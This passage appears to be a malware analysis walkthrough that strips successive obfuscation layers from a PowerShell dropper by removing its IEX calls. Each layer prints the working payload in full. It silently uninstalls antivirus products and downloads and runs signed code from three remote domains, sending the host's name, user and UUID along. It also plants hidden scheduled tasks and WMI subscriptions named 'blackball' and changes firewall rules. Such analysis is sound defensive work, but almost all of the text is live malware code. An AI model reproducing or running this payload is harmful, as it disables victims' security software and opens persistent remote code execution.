Kv1wmicmdpgO})}

       '+' start-sleep 5
qfh+qfh
    }

    Set-Itemqfh+qfhProper'+'ty -Path pgOHKLM:xJySYSTEMxqfh+qfhJyCurrentC'+'ontrolSetxJyServicesxJyLanmanServerxJyParameterspgO DisableCompressionqfh+qfh -Type DWORD -Value 1 ???Force
qfh+qfh
}

cmd.e'+'xe /c netsh.qfh+qfhexe '+'firewall add portopeningqfh+qfh tcp 65529 Sqfh+qfhDNSd
qfh+qfh
'+'netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53

netsh advfirewall firewall add rule n'+'ameqfh+qfh'+'=pg'+'Odeny445pgO dir=in protocqfh+qfhol=tcp qfh+qfhlocalport=445 action=blo'+'ck

netsh advfirewall firewall addq'+'fh+qfh rule nam'+'e=pgOdeny135pgO dir=in protocol=tcp locaqfh+qfhlqfh+qfhport=135 acqfh+qfhtion=block


schtasks /delete /tqfh+qfhn Rtqfh+qfhsa2 /F

'+'schtasks /delete /tn Rtsa1 /F

schqfh+qfhtasks /delete /tn Rtsa /Fqfh).RePlacE(([Char]75+[Char]118+[Char]49),qfh9N0qfh).RePlacE(([Char]102+[Char]'+'69+[Char]72),[STrINg][Char]'+'39).RePlacE(qfhf'+'G9qfh,[STrINg][Char'+']124).RePlacE(('+'[Char]120+[Char]74+'+'[Char]121),qfhh83qfh).RePlacE(([Char]90+[Char]111+[Char]87),[STrINg][Char]96).RePlacE(([Char]112+[Char]103+[Char]79),[STrINg][Char'+']34)'+' ) 

').rePlacE(([cHAr]113+[cHAr]102+[cHAr]104),[StriNG][cHAr]39).rePlacE('9N0','$').rePlacE(([cHAr]104+[cHAr]56+[cHAr]51),[StriNG][cHAr]92)| .( $sHELlid[1]+$shElliD[13]+'X')
```

Remove IEX again: Remove `| .( $sHELlid[1]+$shElliD[13]+'X')`

```powershell
  (' . ( 9N0PShOME[21]+9N0PsHOmE[30]+qfhXqfh) ((qfhcmd /c staqfh+qfhrt /b wmic.exe product where pgOname like fEH%Eset%fEHpgO call uninstall /noinqfh+qfhteractive
'+'
cmd /c start /b wmic.exe product '+'where pgOname like fEH%%Kasperskyqfh+qfh%%fEHpgO call uninstall /qfh+qfhnointeractivqfh+qfhe

cqfh+qfhmd /c start /b wmic.exe product where pgOnaqfh+qfhme like fEH%avast%fEHpgO call uninsqfh+qfhtall'+' /nointeractive

cmd /c start'+' /b wmic.exe product where pgOname like fEqfh+qfhH%avp'+'%fEHpgO call uninstall /nointeractive

cmd /c start /b wmic.exe prqfh+qfhoduct where pgOname like fEH%Security%fEHpgOqfh+qfh call uninstall /noi'+'nteractive

cmd /c start /b wmic.exe pqfh+qfhroduct where pg'+'Oname like '+'fEHqfh+qfh%AntiVirus%fqfh+qfhEHpgO call uninstall /nointeractive

cmd /c start /b wmic.exe productqfh+qfh where pgOname like fEH%Norton Securityqfh+qfh%fEHpgO caqfh+qfhll qfh+qfhuninstall /nointqfh+qfheractive

qfh+qfhcmd /c pgOC:xJy'+'Prograq'+'fh+qfh~1qfh+qfhxJyM'+'alwarebytesxJyAnti-MalwarexJyunins000.exepgO /verys'+'ilent /suqfh+qfhppqfh+qfhressmsgboxes /norestart'+'

Kqfh+qfhv1v=pgO?Kv1vpgO+(Get-Date -Format fE'+'H_yyyyMMddfE'+'H)

Kv1tmps=fEHfunction a(Kv1u){Kv1d='+'qfh+qfh[texqfh+qfht.enco'+'ding]::qfh+qfhutf8.gqfh+qfhetbytes((qfh+qfhnew-object qfh+qfhI'+'O'+'.Strea'+'mReader([nq'+'fh+qfhet.webrequest]::create(Kv1u).getresponseqfh+qfh().getresponsestream())).reaqfh+qfhdtoend());Kv'+'1c=Kv1d.count;if'+'(qfh+qfhKv1c -'+'gt 173){Kv1b=Kv1d[173..Kv1c];Kv1p=New-Object Securitqfh+qfhy.Cryptograp'+'hy.RSAParametqfh+qfhers;Kv1p.Mq'+'fh+qfhoduqfh+qfhluqfh+qfhs=[coqfh+qfhnveq'+'fh+qfhrt]::FromBase64qfh+qfhString(fEHfEqfh+qfhH2mWo17uXvG1BXpmdgv8v'+'/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2m'+'T/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4'+'iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7qfh+qfhrpfqOLdHa10=fEHfEH);Kv1p.Exponent=0x01,0x00,0x01;Kv1r=New-Object Securit'+'y.Cryptography.RSACryptoServiceProvider;Kv1'+'r.Imqfh+qfhportqfh+qfhParameters(Kv1p);if(Kv1r.verifyData(Kv1b,(New-Obqfh+qf'+'hject Seqfh+qfhcurqfh+qfhity.'+'Crypt'+'ograpqfh+qfhhy.SHA1CryptoServicqf'+'h+'+'qfheProvider),[coqfh+qfhnqfh+qfhvqfh+qfhert]::Fqfh+qfhromBase64String(-join([char[qfh+qfh]]Kv1d[0..171])))qfh+qfh){I'+'ZoWex(-join[char[]]Kv1b)}}}Kv1url=fqfh+qfhEHfEHhttp://fEHfEH+fEHfEHU1fEHfEH+fEHfEH'+'U2fEHfEH+fEHfEH/a.jspfEH+Kv1v+fEH?fEHfEH+(@(Kvqfh+qfh1env:COMPUTERNAME,Kv1env:Uqfh+qfhSERNAME,(get-wmiobject Win32_ComputerSystemProducqfh+qfht).UUID,qfh+qfh(random))-joinfEHfEH*fEHfEH);a(Kv1url)fEH
qfh+qfh
Kv1sa=([qfh+qfhSecurity.Prinqfh+qfhcipal.Window'+'sPrincipal][Security'+'.Principal.WindowsIdentity]::GetCurrent()qfh+qfh).IsInRole([Security.Principal.WindowsBuilqfh+qfhtInRole] pgOAdministqfh+qfhratorpgO)

funct'+'ion getRan(){qf'+'h+qfhreturn -join([char[]](48..57+65..90+97..122)fG9Get-Random -Count (6+(Get-Random)%6))}

Kv1us=@(fEHt.zz3r'+'0.comfEH,fEHt'+'.zker9.comfEH,fEHt.bb3u9.comf'+'EH)

Kv1stsrv = New-Object -ComObjecqfh+qfht Schedule.Service

Kv1stsrv.Connect()

try{

Kv1doit=Kv1stsrv.GetFolder(pgOxJypgO).GetTask(pgOblackballpgO)

}catch{}

if(-not Kv1doit){

	if(Kv1sa){

		schta'+'sksqfh+qf'+'h /qfh+qfhcreate /ru system'+' /sc MINUTE /mo 12'+'0 /tn blackball /F /tr qfh+qfhpgOblackballpgO

	} else {

		schtasks /create /sc MINUTE /'+'mo 120 /tn blackball /F /tr '+'pgOblackballpgO

	}

	fore'+'qfh+qfhach(Kv1u in Kv1us){

		Kv1i = [array]::Ind'+'exOfqfh+qfh(Kv1us,Kv1u)

	qfh+qfh	if(Kv1i%3 -eq 0){Kv1tnfqfh+qf'+'h=fEHfEH}

		qfh+qfhif(Kv1i%3 -eq 1){Kv1tnf=qfh+qfhgetRan}

		if(Kv1iqfh+q'+'fh%3 -eq 2){'+'if(Kv1sa){Kv1tnf=fEH'+'MicroSoftqfh+qfhxJyWindowsxJyfEqfh+qfhH+(getRan)}else{Kv1tnf=ge'+'tRan}}

		Kv1tn = '+'getRan

		if(K'+'v1sa){

			s'+'chtasks /create /ru system'+' /sc MINUTE /mo 60 /tn qfh+qfhpgOKv1tnfxJyKv1tnpgO /F /tr pgOpowershell -'+'c PSqfh+qfh_CMDpgO

		} else {

qfh+qfh			schtasks /create /sc MINUTE qfh+qfh/mo 60 /tn pgOqfh+qfhKv1tnfxJyKv1tnpgO'+' /F /tr pgOpo'+'qfh+qfhwershell -w hidden qf'+'h+qfh-c PS_CMDpgO

		}

		start-sleep 1

		Kv1folqfh+qfhder=Kv1stsrv.Gqfh+qfhetFold'+'er(pgOxJyKv1tnfpgO)

		Kv1taskitemqfh+qfh=Kv1folder.GetTqfh+qfhasks(1)

qfh+qfh		foreach(Kv1tas'+'k in Kv1taskitem){

			foreach (Kv1qfh+qfhaction in Kv1taqfh+qfhsk.Definition.Actionsqfh+qfh) {

qfh+qfh	qfh+qfh			try{

					if(Kv1actqfh'+'+qfhion.Arguments.Contains(pgOPS_CMDpgO)){	

						Kv1'+'foqfh+qfhlder.RegisterTask(Kv1task.Namqfh+qfhe, Kv1task.Xml.replaceqfh+qfh(pgOPS_CMDpgO,Kv1tmqfh+qfhps.replace(fEHU1fEH,Kv1u.substring(0,5)).replace'+'(fEHU2fqf'+'h+qfhEH,Kv1u.substring(5))), 4, Kv1null, Kv1null, 0,qfh+qfh'+' Kv1null)fG9out-nqfh+qfhull

					}

				}ca'+'tch{}

			}

		}

		starqfh+qfht-sleep 1

		sqfh+qfhchtasks /ruqfh'+'+qfhn /tn pgOK'+'vqfh+qfh1qfh+qfhtnfxJyKv1tnpgO

		start-sleep 5

	}

}


tr'+'y{

Kqfh+qfhvqf'+'h+qfh1doiqfh+qfht1=Get-Wqfh+qfhMIObject -qfh+qfhClass __Eve'+'ntFilter -Name'+'Space fEHrootxJysubscriptionfEH -qfh+qfhfilter pgOName=fEHb'+'lackballfEqfh+qfhHp'+'gO

}caqfh+qfhtch{}q'+'fh+qfh'+'

if(-not qfh+qfhKv1doit1){

    Set-WmiInstance -Class __EventFilter -NameSpace pgOrootxJysubscriptionpgO -Arguments @{Name=pgOblackballpgO;EventNameSpace=pgOrootxJycimv2pgO;QueryLa'+'ngu'+'age=pgOWQLqfh+q'+'fhpgO;Qu'+'ery=pgOSELECT * FROM __Instaqfh'+'+qfhnceModificationEv'+'ent W'+'ITHIN'+' 3600 Wqfh+qfhHERE TargetInstance IS'+'A fEHWin32_Peqfh+qfhrfForqfh+qfhmatte'+'dData_PerfOS'+'_SystemfEHpgO;} -ErrorAction Stopqfh+qfh

    foreach(Kv1u iqfh+qfhn Kv1us){
qfh+qfh
        Kv1theNam'+'e=getRan

        Kv1wmicmd=K'+'v1tmps.replace(fEHU1fEH,Kv1qfh+qfhu.substring(0,5)).'+'replace(fEHU2fEH,Kv1u.substring(5)).replace(fEHa.jspfqfh+qfhEH,fEHaa.jspfEH)

        Set-WmiInstance '+'qfh+qfh-Class __Filqfh+qfhte'+'rToConsuqfh+qfhmerBinding -Namesqfh+qfhpace pgOrootxJysubscriptionpgO -Arguments @{Filter=(Set-W'+'miInstance -Class __EventFi'+'lter -NameSpaceqfh+qfh pgOrootxJysubscriptionqfh+qfhpgO -A'+'r'+'gumeqfh+qfhnts @{Name=pgOfpgO+Kv1theName;EventNameSpace=pgOroot'+'xJycimv2pgO;Quqfh'+'+qfheryqfh+qfhL'+'anguage=pgOWQLpgO;qfh+qfhQuery=pgOSEqfh+qfhLECT *'+' FROM __InstanceMo'+'dificqfh+qfhatio'+'nE'+'vent WITHIN 3600 WHERE Tar'+'getInstan'+'ce ISA fEHWin32_PerfFormattqfh+qfhedData_PerfOS_SystemfEHpgO;} -ErrorAction Stqfh+qfhop);Consumer=(Set-WmiIq'+'fh+qf'+'hnstance -Class CommandLineEv'+'entConsum'+'er -Namespace pgOrootxJysubscriptionpgO -Argumen'+'ts @{Name=pgOcpgO+Kv'+'1theNam'+'e;ExecutablePat'+'qfh+qfhh=pgOc:xJywiqfh+qfhndowsx'+'Jysy'+'stem32xJycmd.exepgO;CommandLineTemplate=pgO/c powersqfh+qfhhell -c Kv1wmicmdpgO})}

       '+' start-sleep 5
qfh+qfh
    }

    Set-Itemqfh+qfhProper'+'ty -Path pgOHKLM:xJySYSTEMxqfh+qfhJyCurrentC'+'ontrolSetxJyServicesxJyLanmanServerxJyParameterspgO DisableCompressionqfh+qfh -Type DWORD -Value 1 ???Force
qfh+qfh
}

cmd.e'+'xe /c netsh.qfh+qfhexe '+'firewall add portopeningqfh+qfh tcp 65529 Sqfh+qfhDNSd
qfh+qfh
'+'netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53

netsh advfirewall firewall add rule n'+'ameqfh+qfh'+'=pg'+'Odeny445pgO dir=in protocqfh+qfhol=tcp qfh+qfhlocalport=445 action=blo'+'ck

netsh advfirewall firewall addq'+'fh+qfh rule nam'+'e=pgOdeny135pgO dir=in protocol=tcp locaqfh+qfhlqfh+qfhport=135 acqfh+qfhtion=block


schtasks /delete /tqfh+qfhn Rtqfh+qfhsa2 /F

'+'schtasks /delete /tn Rtsa1 /F

schqfh+qfhtasks /delete /tn Rtsa /Fqfh).RePlacE(([Char]75+[Char]118+[Char]49),qfh9N0qfh).RePlacE(([Char]102+[Char]'+'69+[Char]72),[STrINg][Char]'+'39).RePlacE(qfhf'+'G9qfh,[STrINg][Char'+']124).RePlacE(('+'[Char]120+[Char]74+'+'[Char]121),qfhh83qfh).RePlacE(([Char]90+[Char]111+[Char]87),[STrINg][Char]96).RePlacE(([Char]112+[Char]103+[Char]79),[STrINg][Char'+']34)'+' ) 

').rePlacE(([cHAr]113+[cHAr]102+[cHAr]104),[StriNG][cHAr]39).rePlacE('9N0','$').rePlacE(([cHAr]104+[cHAr]56+[cHAr]51),[StriNG][cHAr]92)
```
Gives

```powershell
. ( $PShOME[21]+$PsHOmE[30]+'X') (('cmd /c sta'+'rt /b wmic.exe product where pgOname like fEH%Eset%fEHpgO call uninstall /noin'+'teractive

cmd /c start /b wmic.exe product where pgOname like fEH%%Kaspersky'+'%%fEHpgO call uninstall /'+'nointeractiv'+'e

c'+'md /c start /b wmic.exe product where pgOna'+'me like fEH%avast%fEHpgO call unins'+'tall /nointeractive

cmd /c start /b wmic.exe product where pgOname like fE'+'H%avp%fEHpgO call uninstall /nointeractive

cmd /c start /b wmic.exe pr'+'oduct where pgOname like fEH%Security%fEHpgO'+' call uninstall /nointeractive

cmd /c start /b wmic.exe p'+'roduct where pgOname like fEH'+'%AntiVirus%f'+'EHpgO call uninstall /nointeractive

cmd /c start /b wmic.exe product'+' where pgOname like fEH%Norton Security'+'%fEHpgO ca'+'ll '+'uninstall /noint'+'eractive

'+'cmd /c pgOC:xJyProgra'+'~1'+'xJyMalwarebytesxJyAnti-MalwarexJyunins000.exepgO /verysilent /su'+'pp'+'ressmsgboxes /norestart

K'+'v1v=pgO?Kv1vpgO+(Get-Date -Format fEH_yyyyMMddfEH)

Kv1tmps=fEHfunction a(Kv1u){Kv1d='+'[tex'+'t.encoding]::'+'utf8.g'+'etbytes(('+'new-object '+'IO.StreamReader([n'+'et.webrequest]::create(Kv1u).getresponse'+'().getresponsestream())).rea'+'dtoend());Kv1c=Kv1d.count;if('+'Kv1c -gt 173){Kv1b=Kv1d[173..Kv1c];Kv1p=New-Object Securit'+'y.Cryptography.RSAParamet'+'ers;Kv1p.M'+'odu'+'lu'+'s=[co'+'nve'+'rt]::FromBase64'+'String(fEHfE'+'H2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7'+'rpfqOLdHa10=fEHfEH);Kv1p.Exponent=0x01,0x00,0x01;Kv1r=New-Object Security.Cryptography.RSACryptoServiceProvider;Kv1r.Im'+'port'+'Parameters(Kv1p);if(Kv1r.verifyData(Kv1b,(New-Ob'+'ject Se'+'cur'+'ity.Cryptograp'+'hy.SHA1CryptoServic'+'eProvider),[co'+'n'+'v'+'ert]::F'+'romBase64String(-join([char['+']]Kv1d[0..171])))'+'){IZoWex(-join[char[]]Kv1b)}}}Kv1url=f'+'EHfEHhttp://fEHfEH+fEHfEHU1fEHfEH+fEHfEHU2fEHfEH+fEHfEH/a.jspfEH+Kv1v+fEH?fEHfEH+(@(Kv'+'1env:COMPUTERNAME,Kv1env:U'+'SERNAME,(get-wmiobject Win32_ComputerSystemProduc'+'t).UUID,'+'(random))-joinfEHfEH*fEHfEH);a(Kv1url)fEH
'+'
Kv1sa=(['+'Security.Prin'+'cipal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()'+').IsInRole([Security.Principal.WindowsBuil'+'tInRole] pgOAdminist'+'ratorpgO)

function getRan(){'+'return -join([char[]](48..57+65..90+97..122)fG9Get-Random -Count (6+(Get-Random)%6))}

Kv1us=@(fEHt.zz3r0.comfEH,fEHt.zker9.comfEH,fEHt.bb3u9.comfEH)

Kv1stsrv = New-Object -ComObjec'+'t Schedule.Service

Kv1stsrv.Connect()

try{

Kv1doit=Kv1stsrv.GetFolder(pgOxJypgO).GetTask(pgOblackballpgO)

}catch{}

if(-not Kv1doit){

	if(Kv1sa){

		schtasks'+' /'+'create /ru system /sc MINUTE /mo 120 /tn blackball /F /tr '+'pgOblackballpgO

	} else {

		schtasks /create /sc MINUTE /mo 120 /tn blackball /F /tr pgOblackballpgO

	}

	fore'+'ach(Kv1u in Kv1us){

		Kv1i = [array]::IndexOf'+'(Kv1us,Kv1u)

	'+'	if(Kv1i%3 -eq 0){Kv1tnf'+'=fEHfEH}

		'+'if(Kv1i%3 -eq 1){Kv1tnf='+'getRan}

		if(Kv1i'+'%3 -eq 2){if(Kv1sa){Kv1tnf=fEHMicroSoft'+'xJyWindowsxJyfE'+'H+(getRan)}else{Kv1tnf=getRan}}

		Kv1tn = getRan

		if(Kv1sa){

			schtasks /create /ru system /sc MINUTE /mo 60 /tn '+'pgOKv1tnfxJyKv1tnpgO /F /tr pgOpowershell -c PS'+'_CMDpgO

		} else {

'+'			schtasks /create /sc MINUTE '+'/mo 60 /tn pgO'+'Kv1tnfxJyKv1tnpgO /F /tr pgOpo'+'wershell -w hidden '+'-c PS_CMDpgO

		}

		start-sleep 1

		Kv1fol'+'der=Kv1stsrv.G'+'etFolder(pgOxJyKv1tnfpgO)

		Kv1taskitem'+'=Kv1folder.GetT'+'asks(1)

'+'		foreach(Kv1task in Kv1taskitem){

			foreach (Kv1'+'action in Kv1ta'+'sk.Definition.Actions'+') {

'+'	'+'			try{

					if(Kv1act'+'ion.Arguments.Contains(pgOPS_CMDpgO)){	

						Kv1fo'+'lder.RegisterTask(Kv1task.Nam'+'e, Kv1task.Xml.replace'+'(pgOPS_CMDpgO,Kv1tm'+'ps.replace(fEHU1fEH,Kv1u.substring(0,5)).replace(fEHU2f'+'EH,Kv1u.substring(5))), 4, Kv1null, Kv1null, 0,'+' Kv1null)fG9out-n'+'ull

					}

				}catch{}

			}

		}

		star'+'t-sleep 1

		s'+'chtasks /ru'+'n /tn pgOKv'+'1'+'tnfxJyKv1tnpgO

		start-sleep 5

	}

}


try{

K'+'v'+'1doi'+'t1=Get-W'+'MIObject -'+'Class __EventFilter -NameSpace fEHrootxJysubscriptionfEH -'+'filter pgOName=fEHblackballfE'+'HpgO

}ca'+'tch{}'+'

if(-not '+'Kv1doit1){

    Set-WmiInstance -Class __EventFilter -NameSpace pgOrootxJysubscriptionpgO -Arguments @{Name=pgOblackballpgO;EventNameSpace=pgOrootxJycimv2pgO;QueryLanguage=pgOWQL'+'pgO;Query=pgOSELECT * FROM __Insta'+'nceModificationEvent WITHIN 3600 W'+'HERE TargetInstance ISA fEHWin32_Pe'+'rfFor'+'mattedData_PerfOS_SystemfEHpgO;} -ErrorAction Stop'+'

    foreach(Kv1u i'+'n Kv1us){
'+'
        Kv1theName=getRan

        Kv1wmicmd=Kv1tmps.replace(fEHU1fEH,Kv1'+'u.substring(0,5)).replace(fEHU2fEH,Kv1u.substring(5)).replace(fEHa.jspf'+'EH,fEHaa.jspfEH)

        Set-WmiInstance '+'-Class __Fil'+'terToConsu'+'merBinding -Names'+'pace pgOrootxJysubscriptionpgO -Arguments @{Filter=(Set-WmiInstance -Class __EventFilter -NameSpace'+' pgOrootxJysubscription'+'pgO -Argume'+'nts @{Name=pgOfpgO+Kv1theName;EventNameSpace=pgOrootxJycimv2pgO;Qu'+'ery'+'Language=pgOWQLpgO;'+'Query=pgOSE'+'LECT * FROM __InstanceModific'+'ationEvent WITHIN 3600 WHERE TargetInstance ISA fEHWin32_PerfFormatt'+'edData_PerfOS_SystemfEHpgO;} -ErrorAction St'+'op);Consumer=(Set-WmiI'+'nstance -Class CommandLineEventConsumer -Namespace pgOrootxJysubscriptionpgO -Arguments @{Name=pgOcpgO+Kv1theName;ExecutablePat'+'h=pgOc:xJywi'+'ndowsxJysystem32xJycmd.exepgO;CommandLineTemplate=pgO/c powers'+'hell -c Kv1wmicmdpgO})}

        start-sleep 5
'+'
    }

    Set-Item'+'Property -Path pgOHKLM:xJySYSTEMx'+'JyCurrentControlSetxJyServicesxJyLanmanServerxJyParameterspgO DisableCompression'+' -Type DWORD -Value 1 ???Force
'+'
}

cmd.exe /c netsh.'+'exe firewall add portopening'+' tcp 65529 S'+'DNSd
'+'
netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53

netsh advfirewall firewall add rule name'+'=pgOdeny445pgO dir=in protoc'+'ol=tcp '+'localport=445 action=block

netsh advfirewall firewall add'+' rule name=pgOdeny135pgO dir=in protocol=tcp loca'+'l'+'port=135 ac'+'tion=block


schtasks /delete /t'+'n Rt'+'sa2 /F

schtasks /delete /tn Rtsa1 /F

sch'+'tasks /delete /tn Rtsa /F').RePlacE(([Char]75+[Char]118+[Char]49),'$').RePlacE(([Char]102+[Char]69+[Char]72),[STrINg][Char]39).RePlacE('fG9',[STrINg][Char]124).RePlacE(([Char]120+[Char]74+[Char]121),'\').RePlacE(([Char]90+[Char]111+[Char]87),[STrINg][Char]96).RePlacE(([Char]112+[Char]103+[Char]79),[STrINg][Char]34) ) 
```

Remove IEX again: Remove `. ( $PShOME[21]+$PsHOmE[30]+'X') `

```powershell
(('cmd /c sta'+'rt /b wmic.exe product where pgOname like fEH%Eset%fEHpgO call uninstall /noin'+'teractive

cmd /c start /b wmic.exe product where pgOname like fEH%%Kaspersky'+'%%fEHpgO call uninstall /'+'nointeractiv'+'e

c'+'md /c start /b wmic.exe product where pgOna'+'me like fEH%avast%fEHpgO call unins'+'tall /nointeractive

cmd /c start /b wmic.exe product where pgOname like fE'+'H%avp%fEHpgO call uninstall /nointeractive

cmd /c start /b wmic.exe pr'+'oduct where pgOname like fEH%Security%fEHpgO'+' call uninstall /nointeractive

cmd /c start /b wmic.exe p'+'roduct where pgOname like fEH'+'%AntiVirus%f'+'EHpgO call uninstall /nointeractive

cmd /c start /b wmic.exe product'+' where pgOname like fEH%Norton Security'+'%fEHpgO ca'+'ll '+'uninstall /noint'+'eractive

'+'cmd /c pgOC:xJyProgra'+'~1'+'xJyMalwarebytesxJyAnti-MalwarexJyunins000.exepgO /verysilent /su'+'pp'+'ressmsgboxes /norestart

K'+'v1v=pgO?Kv1vpgO+(Get-Date -Format fEH_yyyyMMddfEH)

Kv1tmps=fEHfunction a(Kv1u){Kv1d='+'[tex'+'t.encoding]::'+'utf8.g'+'etbytes(('+'new-object '+'IO.StreamReader([n'+'et.webrequest]::create(Kv1u).getresponse'+'().getresponsestream())).rea'+'dtoend());Kv1c=Kv1d.count;if('+'Kv1c -gt 173){Kv1b=Kv1d[173..Kv1c];Kv1p=New-Object Securit'+'y.Cryptography.RSAParamet'+'ers;Kv1p.M'+'odu'+'lu'+'s=[co'+'nve'+'rt]::FromBase64'+'String(fEHfE'+'H2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7'+'rpfqOLdHa10=fEHfEH);Kv1p.Exponent=0x01,0x00,0x01;Kv1r=New-Object Security.Cryptography.RSACryptoServiceProvider;Kv1r.Im'+'port'+'Parameters(Kv1p);if(Kv1r.verifyData(Kv1b,(New-Ob'+'ject Se'+'cur'+'ity.Cryptograp'+'hy.SHA1CryptoServic'+'eProvider),[co'+'n'+'v'+'ert]::F'+'romBase64String(-join([char['+']]Kv1d[0..171])))'+'){IZoWex(-join[char[]]Kv1b)}}}Kv1url=f'+'EHfEHhttp://fEHfEH+fEHfEHU1fEHfEH+fEHfEHU2fEHfEH+fEHfEH/a.jspfEH+Kv1v+fEH?fEHfEH+(@(Kv'+'1env:COMPUTERNAME,Kv1env:U'+'SERNAME,(get-wmiobject Win32_ComputerSystemProduc'+'t).UUID,'+'(random))-joinfEHfEH*fEHfEH);a(Kv1url)fEH
'+'
Kv1sa=(['+'Security.Prin'+'cipal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()'+').IsInRole([Security.Principal.WindowsBuil'+'tInRole] pgOAdminist'+'ratorpgO)

function getRan(){'+'return -join([char[]](48..57+65..90+97..122)fG9Get-Random -Count (6+(Get-Random)%6))}

Kv1us=@(fEHt.zz3r0.comfEH,fEHt.zker9.comfEH,fEHt.bb3u9.comfEH)

Kv1stsrv = New-Object -ComObjec'+'t Schedule.Service

Kv1stsrv.Connect()

try{

Kv1doit=Kv1stsrv.GetFolder(pgOxJypgO).GetTask(pgOblackballpgO)

}catch{}

if(-not Kv1doit){

	if(Kv1sa){

		schtasks'+' /'+'create /ru system /sc MINUTE /mo 120 /tn blackball /F /tr '+'pgOblackballpgO

	} else {

		schtasks /create /sc MINUTE /mo 120 /tn blackball /F /tr pgOblackballpgO

	}

	fore'+'ach(Kv1u in Kv1us){

		Kv1i = [array]::IndexOf'+'(Kv1us,Kv1u)

	'+'	if(Kv1i%3 -eq 0){Kv1tnf'+'=fEHfEH}

		'+'if(Kv1i%3 -eq 1){Kv1tnf='+'getRan}

		if(Kv1i'+'%3 -eq 2){if(Kv1sa){Kv1tnf=fEHMicroSoft'+'xJyWindowsxJyfE'+'H+(getRan)}else{Kv1tnf=getRan}}

		Kv1tn = getRan

		if(Kv1sa){

			schtasks /create /ru system /sc MINUTE /mo 60 /tn '+'pgOKv1tnfxJyKv1tnpgO /F /tr pgOpowershell -c PS'+'_CMDpgO

		} else {

'+'			schtasks /create /sc MINUTE '+'/mo 60 /tn pgO'+'Kv1tnfxJyKv1tnpgO /F /tr pgOpo'+'wershell -w hidden '+'-c PS_CMDpgO

		}

		start-sleep 1

		Kv1fol'+'der=Kv1stsrv.G'+'etFolder(pgOxJyKv1tnfpgO)

		Kv1taskitem'+'=Kv1folder.GetT'+'asks(1)

'+'		foreach(Kv1task in Kv1taskitem){

			foreach (Kv1'+'action in Kv1ta'+'sk.Definition.Actions'+') {

'+'	'+'			try{

					if(Kv1act'+'ion.Arguments.Contains(pgOPS_CMDpgO)){	

						Kv1fo'+'lder.RegisterTask(Kv1task.Nam'+'e, Kv1task.Xml.replace'+'(pgOPS_CMDpgO,Kv1tm'+'ps.replace(fEHU1fEH,Kv1u.substring(0,5)).replace(fEHU2f'+'EH,Kv1u.substring(5))), 4, Kv1null, Kv1null, 0,'+' Kv1null)fG9out-n'+'ull

					}

				}catch{}

			}

		}

		star'+'t-sleep 1

		s'+'chtasks /ru'+'n /tn pgOKv'+'1'+'tnfxJyKv1tnpgO

		start-sleep 5

	}

}


try{

K'+'v'+'1doi'+'t1=Get-W'+'MIObject -'+'Class __EventFilter -NameSpace fEHrootxJysubscriptionfEH -'+'filter pgOName=fEHblackballfE'+'HpgO

}ca'+'tch{}'+'

if(-not '+'Kv1doit1){

    Set-WmiInstance -Class __EventFilter -NameSpace pgOrootxJysubscriptionpgO -Arguments @{Name=pgOblackballpgO;EventNameSpace=pgOrootxJycimv2pgO;QueryLanguage=pgOWQL'+'pgO;Query=pgOSELECT * FROM __Insta'+'nceModificationEvent WITHIN 3600 W'+'HERE TargetInstance ISA fEHWin32_Pe'+'rfFor'+'mattedData_PerfOS_SystemfEHpgO;} -ErrorAction Stop'+'

    foreach(Kv1u i'+'n Kv1us){
'+'
        Kv1theName=getRan

        Kv1wmicmd=Kv1tmps.replace(fEHU1fEH,Kv1'+'u.substring(0,5)).replace(fEHU2fEH,Kv1u.substring(5)).replace(fEHa.jspf'+'EH,fEHaa.jspfEH)

        Set-WmiInstance '+'-Class __Fil'+'terToConsu'+'merBinding -Names'+'pace pgOrootxJysubscriptionpgO -Arguments @{Filter=(Set-WmiInstance -Class __EventFilter -NameSpace'+' pgOrootxJysubscription'+'pgO -Argume'+'nts @{Name=pgOfpgO+Kv1theName;EventNameSpace=pgOrootxJycimv2pgO;Qu'+'ery'+'Language=pgOWQLpgO;'+'Query=pgOSE'+'LECT * FROM __InstanceModific'+'ationEvent WITHIN 3600 WHERE TargetInstance ISA fEHWin32_PerfFormatt'+'edData_PerfOS_SystemfEHpgO;} -ErrorAction St'+'op);Consumer=(Set-WmiI'+'nstance -Class CommandLineEventConsumer -Namespace pgOrootxJysubscriptionpgO -Arguments @{Name=pgOcpgO+Kv1theName;ExecutablePat'+'h=pgOc:xJywi'+'ndowsxJysystem32xJycmd.exepgO;CommandLineTemplate=pgO/c powers'+'hell -c Kv1wmicmdpgO})}

        start-sleep 5
'+'
    }

    Set-Item'+'Property -Path pgOHKLM:xJySYSTEMx'+'JyCurrentControlSetxJyServicesxJyLanmanServerxJyParameterspgO DisableCompression'+' -Type DWORD -Value 1 ???Force
'+'
}

cmd.exe /c netsh.'+'exe firewall add portopening'+' tcp 65529 S'+'DNSd
'+'
netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53

netsh advfirewall firewall add rule name'+'=pgOdeny445pgO dir=in protoc'+'ol=tcp '+'localport=445 action=block

netsh advfirewall firewall add'+' rule name=pgOdeny135pgO dir=in protocol=tcp loca'+'l'+'port=135 ac'+'tion=block


schtasks /delete /t'+'n Rt'+'sa2 /F

schtasks /delete /tn Rtsa1 /F

